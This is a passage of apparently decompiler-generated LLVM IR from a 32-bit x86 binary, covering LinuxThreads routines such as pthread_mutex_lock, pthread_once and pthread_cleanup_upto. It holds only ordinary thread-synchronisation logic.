dec_label_pc_804eee3:                             ; preds = %dec_label_pc_804eee1
  br i1 %v5_804eedc, label %dec_label_pc_804eef8, label %dec_label_pc_804ef6e

dec_label_pc_804eeec:                             ; preds = %dec_label_pc_804eee1
  %v9_804eeec = icmp eq i32 %v3_804eed9, 2
  br i1 %v9_804eeec, label %dec_label_pc_804ef2d, label %dec_label_pc_804eef1

dec_label_pc_804eef1:                             ; preds = %dec_label_pc_804eeec
  %v9_804eef1 = icmp eq i32 %v3_804eed9, 3
  %v1_804eef4 = icmp eq i1 %v9_804eef1, false
  br i1 %v1_804eef4, label %dec_label_pc_804ef6e, label %dec_label_pc_804ef56

dec_label_pc_804eef8:                             ; preds = %dec_label_pc_804eee3
  %v1_804eef8 = add i32 %arg1, 16
  store i32 %v1_804eef8, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v1_804eefd = call i32 @__pthread_lock(i32 %v0_804eec3)
  br label %dec_label_pc_804ef13

dec_label_pc_804ef04:                             ; preds = %dec_label_pc_804eed9
  %v1_804ef04 = call i32 @thread_self.18(i32 %v0_804eec3)
  store i32 %v1_804ef04, i32* @ebx, align 4
  %v0_804ef0b = load i32, i32* @esi, align 4
  %v1_804ef0b = add i32 %v0_804ef0b, 8
  %v2_804ef0b = inttoptr i32 %v1_804ef0b to i32*
  %v3_804ef0b = load i32, i32* %v2_804ef0b, align 4
  %v15_804ef0b = icmp eq i32 %v3_804ef0b, %v1_804ef04
  %v1_804ef0e = icmp eq i1 %v15_804ef0b, false
  br i1 %v1_804ef0e, label %dec_label_pc_804ef17, label %dec_label_pc_804ef10

dec_label_pc_804ef10:                             ; preds = %dec_label_pc_804ef04
  %v1_804ef10 = add i32 %v0_804ef0b, 4
  %v2_804ef10 = inttoptr i32 %v1_804ef10 to i32*
  %v3_804ef10 = load i32, i32* %v2_804ef10, align 4
  %v4_804ef10 = add i32 %v3_804ef10, 1
  store i32 %v4_804ef10, i32* %v2_804ef10, align 4
  br label %dec_label_pc_804ef13

dec_label_pc_804ef13:                             ; preds = %dec_label_pc_804ef51, %dec_label_pc_804ef17, %dec_label_pc_804eef8, %dec_label_pc_804ef10
  br label %dec_label_pc_804ef7a

dec_label_pc_804ef17:                             ; preds = %dec_label_pc_804ef04
  %v1_804ef17 = add i32 %v0_804ef0b, 16
  store i32 %v1_804ef17, i32* @eax, align 4
  store i32 %v1_804ef04, i32* @edx, align 4
  %v0_804ef1c = load i32, i32* %stack_var_-12, align 4
  %v1_804ef1c = call i32 @__pthread_lock(i32 %v0_804ef1c)
  %v0_804ef21 = load i32, i32* @ebx, align 4
  %v1_804ef21 = load i32, i32* @esi, align 4
  %v2_804ef21 = add i32 %v1_804ef21, 8
  %v3_804ef21 = inttoptr i32 %v2_804ef21 to i32*
  store i32 %v0_804ef21, i32* %v3_804ef21, align 4
  %v0_804ef24 = load i32, i32* @esi, align 4
  %v1_804ef24 = add i32 %v0_804ef24, 4
  %v2_804ef24 = inttoptr i32 %v1_804ef24 to i32*
  store i32 0, i32* %v2_804ef24, align 4
  br label %dec_label_pc_804ef13

dec_label_pc_804ef2d:                             ; preds = %dec_label_pc_804eeec
  %v1_804ef2d = call i32 @thread_self.18(i32 %v0_804eec3)
  store i32 35, i32* @edx, align 4
  store i32 %v1_804ef2d, i32* @ebx, align 4
  %v0_804ef39 = load i32, i32* @esi, align 4
  %v1_804ef39 = add i32 %v0_804ef39, 8
  %v2_804ef39 = inttoptr i32 %v1_804ef39 to i32*
  %v3_804ef39 = load i32, i32* %v2_804ef39, align 4
  %v15_804ef39 = icmp eq i32 %v3_804ef39, %v1_804ef2d
  br i1 %v15_804ef39, label %dec_label_pc_804ef7a, label %dec_label_pc_804ef3e

dec_label_pc_804ef3e:                             ; preds = %dec_label_pc_804ef2d
  %v1_804ef3f = add i32 %v0_804ef39, 16
  %v0_804ef42 = load i32, i32* @edi, align 4
  %v4_804ef45 = inttoptr i32 %v1_804ef3f to i32*
  %v5_804ef45 = call i32 @__pthread_alt_timedlock(i32* %v4_804ef45, i32 %v1_804ef2d, i32 %v0_804ef42, i32 %v1_804ef2d)
  %v1_804ef4d = icmp eq i32 %v5_804ef45, 0
  br i1 %v1_804ef4d, label %dec_label_pc_804ef75, label %dec_label_pc_804ef51

dec_label_pc_804ef51:                             ; preds = %dec_label_pc_804ef3e
  %v0_804ef51 = load i32, i32* @ebx, align 4
  %v1_804ef51 = load i32, i32* @esi, align 4
  %v2_804ef51 = add i32 %v1_804ef51, 8
  %v3_804ef51 = inttoptr i32 %v2_804ef51 to i32*
  store i32 %v0_804ef51, i32* %v3_804ef51, align 4
  br label %dec_label_pc_804ef13

dec_label_pc_804ef56:                             ; preds = %dec_label_pc_804eef1
  %v1_804ef56 = add i32 %arg1, 16
  %v0_804ef59 = load i32, i32* @ecx, align 4
  %v4_804ef5e = inttoptr i32 %v1_804ef56 to i32*
  %v5_804ef5e = call i32 @__pthread_alt_timedlock(i32* %v4_804ef5e, i32 0, i32 %arg2, i32 %v0_804ef59)
  %v1_804ef68 = icmp eq i32 %v5_804ef5e, 0
  %v1_804ef6a = icmp eq i1 %v1_804ef68, false
  br i1 %v1_804ef6a, label %dec_label_pc_804ef7a, label %dec_label_pc_804ef75

dec_label_pc_804ef6e:                             ; preds = %dec_label_pc_804eee3, %dec_label_pc_804eef1, %entry
  br label %dec_label_pc_804ef7a

dec_label_pc_804ef75:                             ; preds = %dec_label_pc_804ef56, %dec_label_pc_804ef3e
  br label %dec_label_pc_804ef7a

dec_label_pc_804ef7a:                             ; preds = %dec_label_pc_804ef56, %dec_label_pc_804ef2d, %dec_label_pc_804ef6e, %dec_label_pc_804ef13, %dec_label_pc_804ef75
  %v0_804ef7a = phi i32 [ 0, %dec_label_pc_804ef56 ], [ 35, %dec_label_pc_804ef2d ], [ 22, %dec_label_pc_804ef6e ], [ 0, %dec_label_pc_804ef13 ], [ 110, %dec_label_pc_804ef75 ]
  ret i32 %v0_804ef7a

; uselistorder directives
  uselistorder i32 %v1_804ef2d, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804ef04, { 1, 0, 2 }
  uselistorder i32 %v1_804eedc, { 1, 0 }
  uselistorder i32 %v3_804eed9, { 0, 1, 4, 5, 3, 2 }
  uselistorder i32 %v0_804eec3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ef7a, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804ef6e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ef13, { 0, 1, 3, 2 }
}

define i32 @pthread_mutex_lock(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804ef80 = load i32, i32* @esi, align 4
  %v0_804ef81 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_804ef89 = add i32 %arg1, 12
  %v2_804ef89 = inttoptr i32 %v1_804ef89 to i32*
  %v3_804ef89 = load i32, i32* %v2_804ef89, align 4
  %v1_804ef8c = add i32 %v3_804ef89, -1
  %v5_804ef8c = icmp eq i32 %v3_804ef89, 0
  %v9_804ef8c = icmp eq i32 %v1_804ef8c, 0
  br i1 %v9_804ef8c, label %dec_label_pc_804efb6, label %dec_label_pc_804ef91

dec_label_pc_804ef91:                             ; preds = %entry
  %v6_804ef8c = sub i32 0, %v3_804ef89
  %v7_804ef8c = and i32 %v3_804ef89, %v6_804ef8c
  %v8_804ef8c = icmp slt i32 %v7_804ef8c, 0
  %v10_804ef8c = icmp slt i32 %v1_804ef8c, 0
  %v3_804ef91 = icmp eq i1 %v10_804ef8c, %v8_804ef8c
  br i1 %v3_804ef91, label %dec_label_pc_804ef99, label %dec_label_pc_804ef93

dec_label_pc_804ef93:                             ; preds = %dec_label_pc_804ef91
  br i1 %v5_804ef8c, label %dec_label_pc_804efaa, label %dec_label_pc_804efa3

dec_label_pc_804ef99:                             ; preds = %dec_label_pc_804ef91
  %v9_804ef99 = icmp eq i32 %v3_804ef89, 2
  br i1 %v9_804ef99, label %dec_label_pc_804efdf, label %dec_label_pc_804ef9e

dec_label_pc_804ef9e:                             ; preds = %dec_label_pc_804ef99
  %v9_804ef9e = icmp eq i32 %v3_804ef89, 3
  br i1 %v9_804ef9e, label %dec_label_pc_804f001, label %dec_label_pc_804efa3

dec_label_pc_804efa3:                             ; preds = %dec_label_pc_804ef93, %dec_label_pc_804ef9e
  br label %dec_label_pc_804f013

dec_label_pc_804efaa:                             ; preds = %dec_label_pc_804ef93
  %v1_804efaa = add i32 %arg1, 16
  store i32 %v1_804efaa, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v1_804efaf = call i32 @__pthread_lock(i32 %v0_804ef81)
  br label %dec_label_pc_804efc5

dec_label_pc_804efb6:                             ; preds = %entry
  %v1_804efb6 = call i32 @thread_self.18(i32 %v0_804ef81)
  store i32 %v1_804efb6, i32* @ebx, align 4
  %v0_804efbd = load i32, i32* @esi, align 4
  %v1_804efbd = add i32 %v0_804efbd, 8
  %v2_804efbd = inttoptr i32 %v1_804efbd to i32*
  %v3_804efbd = load i32, i32* %v2_804efbd, align 4
  %v15_804efbd = icmp eq i32 %v3_804efbd, %v1_804efb6
  %v1_804efc0 = icmp eq i1 %v15_804efbd, false
  br i1 %v1_804efc0, label %dec_label_pc_804efc9, label %dec_label_pc_804efc2

dec_label_pc_804efc2:                             ; preds = %dec_label_pc_804efb6
  %v1_804efc2 = add i32 %v0_804efbd, 4
  %v2_804efc2 = inttoptr i32 %v1_804efc2 to i32*
  %v3_804efc2 = load i32, i32* %v2_804efc2, align 4
  %v4_804efc2 = add i32 %v3_804efc2, 1
  store i32 %v4_804efc2, i32* %v2_804efc2, align 4
  br label %dec_label_pc_804efc5

dec_label_pc_804efc5:                             ; preds = %dec_label_pc_804efc9, %dec_label_pc_804efaa, %dec_label_pc_804efc2
  br label %dec_label_pc_804f013

dec_label_pc_804efc9:                             ; preds = %dec_label_pc_804efb6
  %v1_804efc9 = add i32 %v0_804efbd, 16
  store i32 %v1_804efc9, i32* @eax, align 4
  store i32 %v1_804efb6, i32* @edx, align 4
  %v1_804efce = call i32 @__pthread_lock(i32 %v0_804ef81)
  %v0_804efd3 = load i32, i32* @ebx, align 4
  %v1_804efd3 = load i32, i32* @esi, align 4
  %v2_804efd3 = add i32 %v1_804efd3, 8
  %v3_804efd3 = inttoptr i32 %v2_804efd3 to i32*
  store i32 %v0_804efd3, i32* %v3_804efd3, align 4
  %v0_804efd6 = load i32, i32* @esi, align 4
  %v1_804efd6 = add i32 %v0_804efd6, 4
  %v2_804efd6 = inttoptr i32 %v1_804efd6 to i32*
  store i32 0, i32* %v2_804efd6, align 4
  br label %dec_label_pc_804efc5

dec_label_pc_804efdf:                             ; preds = %dec_label_pc_804ef99
  %v1_804efdf = call i32 @thread_self.18(i32 %v0_804ef81)
  store i32 %v1_804efdf, i32* @ebx, align 4
  %v0_804efeb = load i32, i32* @esi, align 4
  %v1_804efeb = add i32 %v0_804efeb, 8
  %v2_804efeb = inttoptr i32 %v1_804efeb to i32*
  %v3_804efeb = load i32, i32* %v2_804efeb, align 4
  %v15_804efeb = icmp eq i32 %v3_804efeb, %v1_804efdf
  br i1 %v15_804efeb, label %dec_label_pc_804f013, label %dec_label_pc_804eff0

dec_label_pc_804eff0:                             ; preds = %dec_label_pc_804efdf
  %v1_804eff2 = add i32 %v0_804efeb, 16
  %v3_804eff7 = inttoptr i32 %v1_804eff2 to i32*
  %v4_804eff7 = call i32 @__pthread_alt_lock(i32* %v3_804eff7, i32 %v1_804efdf, i32 35)
  %v0_804effc = load i32, i32* @ebx, align 4
  %v1_804effc = load i32, i32* @esi, align 4
  %v2_804effc = add i32 %v1_804effc, 8
  %v3_804effc = inttoptr i32 %v2_804effc to i32*
  store i32 %v0_804effc, i32* %v3_804effc, align 4
  br label %dec_label_pc_804f00e

dec_label_pc_804f001:                             ; preds = %dec_label_pc_804ef9e
  %v1_804f001 = add i32 %arg1, 16
  %v0_804f004 = load i32, i32* @ecx, align 4
  %v3_804f009 = inttoptr i32 %v1_804f001 to i32*
  %v4_804f009 = call i32 @__pthread_alt_lock(i32* %v3_804f009, i32 0, i32 %v0_804f004)
  br label %dec_label_pc_804f00e

dec_label_pc_804f00e:                             ; preds = %dec_label_pc_804eff0, %dec_label_pc_804f001
  br label %dec_label_pc_804f013

dec_label_pc_804f013:                             ; preds = %dec_label_pc_804efdf, %dec_label_pc_804efc5, %dec_label_pc_804efa3, %dec_label_pc_804f00e
  %v0_804f016 = phi i32 [ 35, %dec_label_pc_804efdf ], [ 0, %dec_label_pc_804efc5 ], [ 22, %dec_label_pc_804efa3 ], [ 0, %dec_label_pc_804f00e ]
  %v2_804f013 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f013, i32* @edx, align 4
  store i32 %v0_804ef81, i32* @ebx, align 4
  store i32 %v0_804ef80, i32* @esi, align 4
  ret i32 %v0_804f016

; uselistorder directives
  uselistorder i32 %v1_804efdf, { 1, 0, 2 }
  uselistorder i32 %v1_804efb6, { 1, 0, 2 }
  uselistorder i32 %v1_804ef8c, { 1, 0 }
  uselistorder i32 %v3_804ef89, { 0, 1, 4, 5, 3, 2 }
  uselistorder i32 %v0_804ef81, { 0, 3, 1, 2, 4 }
  uselistorder i32 (i32*, i32, i32)* @__pthread_alt_lock, { 1, 2, 0 }
  uselistorder i32 (i32)* @thread_self.18, { 1, 0, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804f013, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804f00e, { 1, 0 }
  uselistorder label %dec_label_pc_804efc5, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804efa3, { 1, 0 }
}

define i32 @__pthread_once_fork_prepare() local_unnamed_addr {
entry:
  %v1_804f01f = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8063008.195 to i32))
  ret i32 %v1_804f01f
}

define i32 @pthread_once(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v0_804f028 = load i32, i32* @esi, align 4
  store i32 %tmp3, i32* @esi, align 4
  %v2_804f031 = load i32, i32* %arg1, align 4
  %v11_804f031 = icmp eq i32 %v2_804f031, 2
  %v1_804f034 = icmp eq i1 %v11_804f031, false
  br i1 %v1_804f034, label %dec_label_pc_804f03b, label %dec_label_pc_804f102

dec_label_pc_804f03b:                             ; preds = %entry
  %v1_804f043 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8063008.195 to i32))
  %v0_804f048 = load i32, i32* @esi, align 4
  %v1_804f048 = inttoptr i32 %v0_804f048 to i32*
  %v2_804f048 = load i32, i32* %v1_804f048, align 4
  %v1_804f04f = urem i32 %v2_804f048, 4
  %v8_804f052 = icmp eq i32 %v1_804f04f, 1
  %v1_804f053 = icmp eq i1 %v8_804f052, false
  br i1 %v1_804f053, label %dec_label_pc_804f07c.preheader, label %dec_label_pc_804f055

dec_label_pc_804f055:                             ; preds = %dec_label_pc_804f03b
  %v1_804f055 = and i32 %v2_804f048, -4
  %v1_804f058 = load i32, i32* @global_var_806302c.197, align 4
  %v12_804f058 = icmp eq i32 %v1_804f055, %v1_804f058
  br i1 %v12_804f058, label %dec_label_pc_804f07c.preheader, label %dec_label_pc_804f060

dec_label_pc_804f060:                             ; preds = %dec_label_pc_804f055
  store i32 0, i32* %v1_804f048, align 4
  %v0_804f07c14.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f07c.preheader

dec_label_pc_804f07c.preheader:                   ; preds = %dec_label_pc_804f060, %dec_label_pc_804f03b, %dec_label_pc_804f055
  %v0_804f07c14 = phi i32 [ %v0_804f07c14.pre, %dec_label_pc_804f060 ], [ %v0_804f048, %dec_label_pc_804f03b ], [ %v0_804f048, %dec_label_pc_804f055 ]
  %v1_804f07c15 = inttoptr i32 %v0_804f07c14 to i32*
  %v2_804f07c16 = load i32, i32* %v1_804f07c15, align 4
  %v1_804f08017 = urem i32 %v2_804f07c16, 4
  %v8_804f08319 = icmp eq i32 %v1_804f08017, 1
  br i1 %v8_804f08319, label %dec_label_pc_804f068, label %dec_label_pc_804f086

dec_label_pc_804f068:                             ; preds = %dec_label_pc_804f07c.preheader, %dec_label_pc_804f068
  %v0_804f068 = load i32, i32* @ecx, align 4
  %v4_804f074 = call i32 @__GI_pthread_cond_wait(i32 ptrtoint (i32* @global_var_8063020.196 to i32), i32 ptrtoint (i32* @global_var_8063008.195 to i32), i32 %v0_804f068, i32 %v0_804f068)
  %v0_804f07c = load i32, i32* @esi, align 4
  %v1_804f07c = inttoptr i32 %v0_804f07c to i32*
  %v2_804f07c = load i32, i32* %v1_804f07c, align 4
  %v1_804f080 = urem i32 %v2_804f07c, 4
  %v8_804f083 = icmp eq i32 %v1_804f080, 1
  br i1 %v8_804f083, label %dec_label_pc_804f068, label %dec_label_pc_804f086

dec_label_pc_804f086:                             ; preds = %dec_label_pc_804f068, %dec_label_pc_804f07c.preheader
  %v1_804f07c.lcssa = phi i32* [ %v1_804f07c15, %dec_label_pc_804f07c.preheader ], [ %v1_804f07c, %dec_label_pc_804f068 ]
  %v2_804f07c.lcssa = phi i32 [ %v2_804f07c16, %dec_label_pc_804f07c.preheader ], [ %v2_804f07c, %dec_label_pc_804f068 ]
  store i32 0, i32* @ebx, align 4
  %v1_804f088 = icmp eq i32 %v2_804f07c.lcssa, 0
  %v1_804f08a = icmp eq i1 %v1_804f088, false
  br i1 %v1_804f08a, label %dec_label_pc_804f086.dec_label_pc_804f0de_crit_edge, label %dec_label_pc_804f08c

dec_label_pc_804f086.dec_label_pc_804f0de_crit_edge: ; preds = %dec_label_pc_804f086
  br label %dec_label_pc_804f0de

dec_label_pc_804f08c:                             ; preds = %dec_label_pc_804f086
  %v0_804f08f = load i32, i32* @global_var_806302c.197, align 4
  %v1_804f094 = or i32 %v0_804f08f, 1
  store i32 %v1_804f094, i32* %v1_804f07c.lcssa, align 4
  %v1_804f09e = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8063008.195 to i32))
  %v0_804f0a6 = load i32, i32* @esi, align 4
  %v2_804f0ac = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804f0ac, i32* @ebx, align 4
  %v4_804f0b1 = call i32 @_pthread_cleanup_push(i32* nonnull %stack_var_-24, i32 134541578, i32 %v0_804f0a6)
  call void @__pseudo_call(i32 %tmp3)
  %v3_804f0bf = call i32 @_pthread_cleanup_pop(i32* nonnull %stack_var_-24, i32 0)
  %v1_804f0cb = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8063008.195 to i32))
  store i32 1, i32* @ebx, align 4
  %v0_804f0d5 = load i32, i32* @esi, align 4
  %v1_804f0d5 = inttoptr i32 %v0_804f0d5 to i32*
  store i32 2, i32* %v1_804f0d5, align 4
  br label %dec_label_pc_804f0de

dec_label_pc_804f0de:                             ; preds = %dec_label_pc_804f086.dec_label_pc_804f0de_crit_edge, %dec_label_pc_804f08c
  %v1_804f0e6 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8063008.195 to i32))
  %v0_804f0ee = load i32, i32* @ebx, align 4
  %v1_804f0ee = icmp eq i32 %v0_804f0ee, 0
  br i1 %v1_804f0ee, label %dec_label_pc_804f102, label %dec_label_pc_804f0f2

dec_label_pc_804f0f2:                             ; preds = %dec_label_pc_804f0de
  %v1_804f0fa = call i32 @pthread_cond_broadcast(i32 ptrtoint (i32* @global_var_8063020.196 to i32))
  br label %dec_label_pc_804f102

dec_label_pc_804f102:                             ; preds = %entry, %dec_label_pc_804f0de, %dec_label_pc_804f0f2
  store i32 %v0_804f028, i32* @esi, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_804f07c, { 1, 0 }
  uselistorder i32 %v2_804f07c16, { 1, 0 }
  uselistorder i32 %v2_804f048, { 1, 0 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i32* @global_var_806302c.197, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804f102, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f0de, { 1, 0 }
  uselistorder label %dec_label_pc_804f068, { 1, 0 }
  uselistorder label %dec_label_pc_804f07c.preheader, { 0, 2, 1 }
}

define i32 @pthread_once_cancelhandler(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804f10a = load i32, i32* @ebx, align 4
  store i32 %v0_804f10a, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804f117 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8063008.195 to i32))
  %v0_804f11c = load i32, i32* @ebx, align 4
  %v1_804f11c = inttoptr i32 %v0_804f11c to i32*
  store i32 0, i32* %v1_804f11c, align 4
  %v1_804f129 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8063008.195 to i32))
  %v2_804f139 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f139, i32* @ebx, align 4
  %v1_804f13a = call i32 @pthread_cond_broadcast(i32 ptrtoint (i32* @global_var_8063020.196 to i32))
  ret i32 %v1_804f13a

; uselistorder directives
  uselistorder i32 (i32)* @pthread_cond_broadcast, { 1, 0 }
  uselistorder i32* @global_var_8063020.196, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8063020.196 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8063008.195 to i32), { 0, 1, 3, 4, 5, 2, 6, 7, 8, 9 }
}

define i32 @pthread_cleanup_upto(i32 %arg1) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-480 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804f143 = load i32, i32* @ebx, align 4
  store i32 %v0_804f143, i32* %stack_var_-16, align 4
  %v4_804f143 = ptrtoint i32* %stack_var_-16 to i32
  %v0_804f147 = load i32, i32* @eax, align 4
  store i32 %v0_804f147, i32* %edi.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8062320 to i32), i32* %esi.global-to-local, align 4
  %v1_804f152 = load i32, i32* @global_var_8062fec.134, align 4
  %v7_804f152 = icmp ult i32 %v4_804f143, %v1_804f152
  %v1_804f158 = icmp eq i1 %v7_804f152, false
  br i1 %v1_804f158, label %dec_label_pc_804f190, label %dec_label_pc_804f15a

dec_label_pc_804f15a:                             ; preds = %entry
  %v1_804f15a = load i32, i32* @global_var_8062ff0.135, align 16
  %v7_804f15a = icmp ult i32 %v4_804f143, %v1_804f15a
  br i1 %v7_804f15a, label %dec_label_pc_804f16f, label %dec_label_pc_804f162

dec_label_pc_804f162:                             ; preds = %dec_label_pc_804f15a
  store i32 ptrtoint (i32* @global_var_8062500.136 to i32), i32* %esi.global-to-local, align 4
  %v1_804f167 = load i32, i32* @global_var_8062ff4.137, align 4
  %v7_804f167 = icmp ult i32 %v4_804f143, %v1_804f167
  br i1 %v7_804f167, label %dec_label_pc_804f190, label %dec_label_pc_804f16f

dec_label_pc_804f16f:                             ; preds = %dec_label_pc_804f162, %dec_label_pc_804f15a
  %v0_804f16f = load i32, i32* @global_var_8067650.138, align 16
  %v1_804f16f = icmp eq i32 %v0_804f16f, 0
  br i1 %v1_804f16f, label %dec_label_pc_804f185, label %dec_label_pc_804f178

dec_label_pc_804f178:                             ; preds = %dec_label_pc_804f16f
  %v0_804f178 = call i32 @__pthread_find_self()
  store i32 %v0_804f178, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f190

dec_label_pc_804f181:                             ; preds = %dec_label_pc_804f199
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f1b4

dec_label_pc_804f185:                             ; preds = %dec_label_pc_804f16f
  %v2_804f18a = ptrtoint i32* %stack_var_-480 to i32
  store i32 %v2_804f18a, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f190

dec_label_pc_804f190:                             ; preds = %dec_label_pc_804f162, %entry, %dec_label_pc_804f178, %dec_label_pc_804f185
  %v0_804f194 = phi i32 [ ptrtoint (i32* @global_var_8062500.136 to i32), %dec_label_pc_804f162 ], [ ptrtoint (i32* @global_var_8062320 to i32), %entry ], [ %v0_804f178, %dec_label_pc_804f178 ], [ %v2_804f18a, %dec_label_pc_804f185 ]
  store i32 %v4_804f143, i32* %ebp.global-to-local, align 4
  %v1_804f194 = add i32 %v0_804f194, 60
  %v2_804f194 = inttoptr i32 %v1_804f194 to i32*
  %v3_804f194 = load i32, i32* %v2_804f194, align 4
  store i32 %v3_804f194, i32* %ebx.global-to-local, align 4
  %v1_804f1ab2 = icmp eq i32 %v3_804f194, 0
  br i1 %v1_804f1ab2, label %dec_label_pc_804f1b4, label %dec_label_pc_804f1af.lr.ph

dec_label_pc_804f1af.lr.ph:                       ; preds = %dec_label_pc_804f190
  br label %dec_label_pc_804f1af

dec_label_pc_804f199:                             ; preds = %dec_label_pc_804f1af
  %v1_804f199 = load i32, i32* %ebp.global-to-local, align 4
  %tmp = icmp ugt i32 %v4_804f1a3, %v1_804f199
  br i1 %tmp, label %dec_label_pc_804f19d, label %dec_label_pc_804f181

dec_label_pc_804f19d:                             ; preds = %dec_label_pc_804f199
  %v5_804f1a3 = inttoptr i32 %v4_804f1a3 to i32*
  %v6_804f1a3 = load i32, i32* %v5_804f1a3, align 4
  call void @__pseudo_call(i32 %v6_804f1a3)
  %v0_804f1a5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f1a5 = add i32 %v0_804f1a5, 12
  %v2_804f1a5 = inttoptr i32 %v1_804f1a5 to i32*
  %v3_804f1a5 = load i32, i32* %v2_804f1a5, align 4
  store i32 %v3_804f1a5, i32* %ebx.global-to-local, align 4
  %v1_804f1ab = icmp eq i32 %v3_804f1a5, 0
  br i1 %v1_804f1ab, label %dec_label_pc_804f1b4, label %dec_label_pc_804f1af

dec_label_pc_804f1af:                             ; preds = %dec_label_pc_804f1af.lr.ph, %dec_label_pc_804f19d
  %v4_804f1a3 = phi i32 [ %v3_804f194, %dec_label_pc_804f1af.lr.ph ], [ %v3_804f1a5, %dec_label_pc_804f19d ]
  %v1_804f1af = load i32, i32* %edi.global-to-local, align 4
  %v2_804f1af = add i32 %v1_804f1af, 16
  %v3_804f1af = inttoptr i32 %v2_804f1af to i32*
  %v4_804f1af = load i32, i32* %v3_804f1af, align 4
  %v10_804f1af = icmp ult i32 %v4_804f1a3, %v4_804f1af
  br i1 %v10_804f1af, label %dec_label_pc_804f199, label %dec_label_pc_804f1b4

dec_label_pc_804f1b4:                             ; preds = %dec_label_pc_804f19d, %dec_label_pc_804f1af, %dec_label_pc_804f190, %dec_label_pc_804f181
  %v0_804f1b7 = phi i32 [ 0, %dec_label_pc_804f181 ], [ 0, %dec_label_pc_804f190 ], [ %v4_804f1a3, %dec_label_pc_804f1af ], [ 0, %dec_label_pc_804f19d ]
  %v0_804f1b4 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f1b4 = add i32 %v0_804f1b4, 84
  %v2_804f1b4 = inttoptr i32 %v1_804f1b4 to i32*
  %v3_804f1b4 = load i32, i32* %v2_804f1b4, align 4
  %v2_804f1b7 = add i32 %v0_804f1b4, 60
  %v3_804f1b7 = inttoptr i32 %v2_804f1b7 to i32*
  store i32 %v0_804f1b7, i32* %v3_804f1b7, align 4
  %v1_804f1ba = icmp eq i32 %v3_804f1b4, 0
  br i1 %v1_804f1ba, label %dec_label_pc_804f1ca, label %dec_label_pc_804f1be

dec_label_pc_804f1be:                             ; preds = %dec_label_pc_804f1b4
  %v1_804f1be = load i32, i32* %edi.global-to-local, align 4
  %v2_804f1be = add i32 %v1_804f1be, 16
  %v3_804f1be = inttoptr i32 %v2_804f1be to i32*
  %v4_804f1be = load i32, i32* %v3_804f1be, align 4
  %v10_804f1be = icmp ult i32 %v3_804f1b4, %v4_804f1be
  %v1_804f1c1 = icmp eq i1 %v10_804f1be, false
  br i1 %v1_804f1c1, label %dec_label_pc_804f1ca, label %dec_label_pc_804f1c3

dec_label_pc_804f1c3:                             ; preds = %dec_label_pc_804f1be
  %v0_804f1c3 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f1c3 = add i32 %v0_804f1c3, 84
  %v2_804f1c3 = inttoptr i32 %v1_804f1c3 to i32*
  store i32 0, i32* %v2_804f1c3, align 4
  br label %dec_label_pc_804f1ca

dec_label_pc_804f1ca:                             ; preds = %dec_label_pc_804f1be, %dec_label_pc_804f1b4, %dec_label_pc_804f1c3
  %v2_804f1cd = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804f1cd, i32* @ebx, align 4
  ret i32 %v3_804f1b4

; uselistorder directives
  uselistorder i32 %v3_804f1b4, { 2, 0, 1 }
  uselistorder i32 %v4_804f1a3, { 1, 3, 0, 2 }
  uselistorder i32 %v3_804f1a5, { 1, 0, 2 }
  uselistorder i32 %v4_804f143, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %esi.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804f1ca, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f1b4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804f1af, { 1, 0 }
  uselistorder label %dec_label_pc_804f190, { 3, 2, 0, 1 }
}

